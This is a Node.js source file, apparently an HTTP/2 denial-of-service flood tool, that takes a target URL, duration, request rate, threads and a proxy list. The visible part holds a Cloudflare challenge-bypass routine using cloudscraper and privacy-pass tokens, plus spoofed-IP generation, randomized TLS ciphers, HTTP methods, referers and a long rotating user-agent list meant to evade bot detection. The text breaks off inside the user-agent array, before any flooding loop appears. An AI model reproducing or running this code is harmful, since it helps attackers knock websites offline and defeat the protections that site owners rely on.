const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const axios = require("axios");
const cheerio = require("cheerio");
const colors = require("colors");
const os = require("os");
module.exports = function Cloudflare() {
  const privacypass = require("./privacypass"),
    cloudscraper = require("cloudscraper"),
    request = require("request"),
    fs = require("fs");
  var privacyPassSupport = true;
  function useNewToken() {
    privacypass(l7.target);
    console.log("[cloudflare-bypass ~ privacypass]: generated new token");
  }

  if (l7.firewall[1] == "captcha") {
    privacyPassSupport = l7.firewall[2];
    useNewToken();
  }

  function bypass(proxy, uagent, callback, force) {
    num =
      Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10));
    var cookie = "";
    if (l7.firewall[1] == "captcha" || (force && privacyPassSupport)) {
      request.get(
        {
          url: l7.target + "?_asds=" + num,
          gzip: true,
          proxy: proxy,
          headers: {
            Connection: "Keep-Alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": 1,
            "User-Agent": uagent,
            Accept:
              "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US;q=0.9",
          },
        },
        (err, res) => {
          if (!res) {
            return false;
          }
          if (res.headers["cf-chl-bypass"] && res.headers["set-cookie"]) {
          } else {
            if (l7.firewall[1] == "captcha") {
              logger(
                "[cloudflare-bypass]: The target is not supporting privacypass",
              );
              return false;
            } else {
              privacyPassSupport = false;
            }
          }

          cookie = res.headers["set-cookie"].shift().split(";").shift();
          if (
            (l7.firewall[1] == "captcha" && privacyPassSupport) ||
            (force && privacyPassSupport)
          ) {
            cloudscraper.get(
              {
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                  Connection: "Keep-Alive",
                  "Cache-Control": "max-age=0",
                  "Upgrade-Insecure-Requests": 1,
                  "User-Agent": uagent,
                  Accept:
                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                  "Accept-Encoding": "gzip, deflate, br",
                  "Accept-Language": "en-US;q=0.9",
                  "challenge-bypass-token": l7.privacypass,
                  Cookie: cookie,
                },
              },
              (err, res) => {
                if (err || !res) return false;
                if (res.headers["set-cookie"]) {
                  cookie +=
                    "; " + res.headers["set-cookie"].shift().split(";").shift();
                  cloudscraper.get(
                    {
                      url: l7.target + "?_asds=" + num,
                      proxy: proxy,
                      headers: {
                        Connection: "Keep-Alive",
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests": 1,
                        "User-Agent": uagent,
                        Accept:
                          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "en-US;q=0.9",
                        Cookie: cookie,
                      },
                    },
                    (err, res, body) => {
                      if (err || !res || (res && res.statusCode == 403)) {
                        console.warn(
                          "[cloudflare-bypass ~ privacypass]: Failed to bypass with privacypass, generating new token:",
                        );
                        useNewToken();
                        return;
                      }
                      callback(cookie);
                    },
                  );
                } else {
                  console.log(res.statusCode, res.headers);
                  if (res.headers["cf-chl-bypass-resp"]) {
                    let respHeader = res.headers["cf-chl-bypass-resp"];
                    switch (respHeader) {
                      case "6":
                        console.warn(
                          "[privacy-pass]: internal server connection error occurred",
                        );
                        break;
                      case "5":
                        console.warn(
                          `[privacy-pass]: token verification failed for ${l7.target}`,
                        );
                        useNewToken();
                        break;
                      case "7":
                        console.warn(
                          `[privacy-pass]: server indicated a bad client request`,
                        );
                        break;
                      case "8":
                        console.warn(
                          `[privacy-pass]: server sent unrecognised response code (${header.value})`,
                        );
                        break;
                    }
                    return bypass(proxy, uagent, callback, true);
                  }
                }
              },
            );
          } else {
            cloudscraper.get(
              {
                url: l7.target + "?_asds=" + num,
                proxy: proxy,
                headers: {
                  Connection: "Keep-Alive",
                  "Cache-Control": "max-age=0",
                  "Upgrade-Insecure-Requests": 1,
                  "User-Agent": uagent,
                  "Accept-Language": "en-US;q=0.9",
                },
              },
              (err, res) => {
                if (err || !res || !res.request.headers.cookie) {
                  if (err) {
                    if (err.name == "CaptchaError") {
                      return bypass(proxy, uagent, callback, true);
                    }
                  }
                  return false;
                }
                callback(res.request.headers.cookie);
              },
            );
          }
        },
      );
    } else if (l7.firewall[1] == "uam" && privacyPassSupport == false) {
      cloudscraper.get(
        {
          url: l7.target + "?_asds=" + num,
          proxy: proxy,
          headers: {
            "Upgrade-Insecure-Requests": 1,
            "User-Agent": uagent,
          },
        },
        (err, res, body) => {
          if (err) {
            if (err.name == "CaptchaError") {
              return bypass(proxy, uagent, callback, true);
            }
            return false;
          }
          if (res && res.request.headers.cookie) {
            callback(res.request.headers.cookie);
          } else if (res && body && res.headers.server == "cloudflare") {
            if (
              res &&
              body &&
              /Why do I have to complete a CAPTCHA/.test(body) &&
              res.headers.server == "cloudflare" &&
              res.statusCode !== 200
            ) {
              return bypass(proxy, uagent, callback, true);
            }
          } else {
          }
        },
      );
    } else {
      cloudscraper.get(
        {
          url: l7.target + "?_asds=" + num,
          gzip: true,
          proxy: proxy,
          headers: {
            Connection: "Keep-Alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": 1,
            "User-Agent": uagent,
            Accept:
              "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US;q=0.9",
          },
        },
        (err, res, body) => {
          if (err || !res || !body || !res.headers["set-cookie"]) {
            if (
              res &&
              body &&
              /Why do I have to complete a CAPTCHA/.test(body) &&
              res.headers.server == "cloudflare" &&
              res.statusCode !== 200
            ) {
              return bypass(proxy, uagent, callback, true);
            }
            return false;
          }
          cookie = res.headers["set-cookie"].shift().split(";").shift();
          callback(cookie);
        },
      );
    }
  }

  return bypass;
};

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (exception) {});

if (process.argv.length < 7) {
  console.log(`
           ____ ___                   ____           
  |    |   \\ ___________     / ___\\   ____   
  |    |   //  ___/\\__  \\   / /_/  >_/ __ \\  
  |    |  / \\___ \\  / __ \\_ \\___  / \\  ___/  
  |______/ /____  >(____  //_____/   \\___  > 
                \\/      \\/               \\/  

  `);
  console.log(
    `Usage: node h2 <target> <duration> <requests per second> <threads> <proxyfile>
    Example: node h2 https://cybersecurity.test/ 120 32 2 proxy.txt`.red,
  );
  process.exit();
}
const headers = {};
function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

const ip_spoof = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  Rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxyFile: process.argv[6],
};
const sig = [
  "ecdsa_secp256r1_sha256",
  "ecdsa_secp384r1_sha384",
  "ecdsa_secp521r1_sha512",
  "rsa_pss_rsae_sha256",
  "rsa_pss_rsae_sha384",
  "rsa_pss_rsae_sha512",
  "rsa_pkcs1_sha256",
  "rsa_pkcs1_sha384",
  "rsa_pkcs1_sha512",
];
const sigalgs1 = sig.join(":");
const cplist = [
  "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES",
];
const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
];
const lang_header = ["en-US,en;q=0.9"];
const encoding_header = ["gzip, deflate, br"];
const Methods = [
  "GET",
  "HEAD",
  "POST",
  "PUT",
  "DELETE",
  "CONNECT",
  "OPTIONS",
  "TRACE",
  "PATCH",
];
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
const control_header = ["no-cache", "max-age=0"];
const refers = [
  "https://www.google.com/",
  "https://www.facebook.com/",
  "https://www.twitter.com/",
  "https://www.youtube.com/",
  "https://www.linkedin.com/",
];
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers1 =
  "GREASE:" +
  [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3),
  ].join(":");

const uap = [
  "mozilla/5.0 (macintosh; intel mac os x 10_13_0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_2) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_3) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_4) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_5) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_6) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_2) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_3) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_5) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_6) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_2) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_3) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_4) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_5) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_6) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_7) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_8) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_0_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_1_2) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_2) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_2_3) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_3) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_4) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_5) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_5_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_5_2) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 11_6) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_2) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_2_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_3) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_3_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_3_2) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_4) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_4_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_5) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_6) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 12_6_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 13_0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 13_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 13_2) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 13_2_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 13_3) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 13_4) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 13_4_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 13_5) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 13_6) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 14_0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 14_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 14_2) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 14_3) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 14_4) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 14_5) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 14_6) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6327.120 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 14_6) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6339.100 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 14_6) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6367.92 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 14_6_1) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (windows nt 10.0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; arm64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; wow64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6344.209 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; wow64; arm) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; wow64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6342.225 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; wow64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6349.204 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.17",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.29",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.3",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36 avast/124.0.0.0",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.65",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.67",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 whale/3.26.244.21 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6337.198 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6367.118 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6367.207 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6367.61 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6367.79 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6367.92 safari/537.36",
  "mozilla/5.0 (windows nt 10.0; win64; x86_64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (windows nt 10.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (windows nt 10.1; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (windows nt 11.0; wow64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6308.223 safari/537.36",
  "mozilla/5.0 (windows nt 11.0; win32; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (windows nt 11.0; win64; arm) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (windows nt 6.3; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/124.0.6367.78 safari/537.36",
  "mozilla/8.0 (windows nt 11; win64; x64) applewebkit/618.1.15 (khtml, like gecko) chrome/124.0.6356.6 safari/19618.1.15",
  "mozilla/5.0 (x11; cros x86_64 10320.81.0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (x11; cros x86_64 10983.82.0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (x11; cros x86_64 11580.99.0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (x11; cros x86_64 12105.100.0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (x11; cros x86_64 12739.111.0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (x11; cros x86_64 13310.91.0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (x11; cros x86_64 13816.64.0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (x11; cros x86_64 14388.73.0) applewebkit/537.36 (khtml, like gecko) chrome/124.0.0.0 safari/537.36",
  "mozilla/5.0 (macintosh; intel mac os x 10_12_0) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_12_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_12_2) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_12_3) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_12_4) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_12_5) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_12_6) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_0) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_2) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_3) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_4) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_5) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_13_6) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_0) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_2) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_3) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_4) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_5) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_14_6) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_0) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_2) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_3) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_4) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_5) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_6) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 10_15_7) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 11_0) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 11_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 11_2) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 11_3) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 11_4) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 11_5) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 11_6) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 12_0) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 12_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 12_2) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 12_3) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 12_4) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 12_5) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 12_6) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 12_6_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_0) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
